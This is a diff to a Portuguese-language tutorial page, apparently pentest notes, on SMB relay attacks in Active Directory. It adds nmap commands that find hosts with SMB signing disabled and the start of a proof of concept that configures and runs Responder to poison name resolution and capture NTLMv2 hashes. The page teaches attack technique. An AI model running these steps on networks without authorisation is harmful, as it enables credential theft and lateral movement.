@@ -4,6 +4,9 @@ title: "SMB Relay Attack"
 draft: false
 tags:
   - Active Directory
+  - Poisoning & Spoofing
+  - NTLMV2
+  - MITM
   - SMB
 ---
 
@@ -29,6 +32,44 @@ Para que este ataque seja possivel, o ambiente tem de ter os seguintes requisito
 
 ## Enumeração
 
-- #### SMB Signing Disabled
+### SMB Signing Disabled
 
-`nmap -x`
+O primeiro passo é verificar se o _SMB Signing_ está inactivo e para isso usaremos o nmap com o comando abaixo:
+
+```bash
+
+nmap -Pn --script=smb2-security-mode.nse -p 445 <IP>
+
+```
+
+ou
+
+```bash
+
+nmap -Pn --script=smb2-security-mode.nse -p 445 <IP>/<CIDR>
+
+```
+
+Podemos verificar que está activo mas não obrigatório o seu uso.
+
+![](smbrecon.png#center)
+
+## Exploração (PoC)
+
+### Configuração do _responder_
+
+Como o objectivo é reenviar a _hash_ que iremos receber para outra workstation iremos configurar o _responder_ .
+Teremos que desabilitar
+
+```bash
+sudo vi /etc/responder/Responder.conf
+```
+
+![](smbrelayresponderconfig.png)
+
+```bash
+sudo responder -I eth0 -wdv
+
+```
+
+![](smbrelayresponderrunning.png)
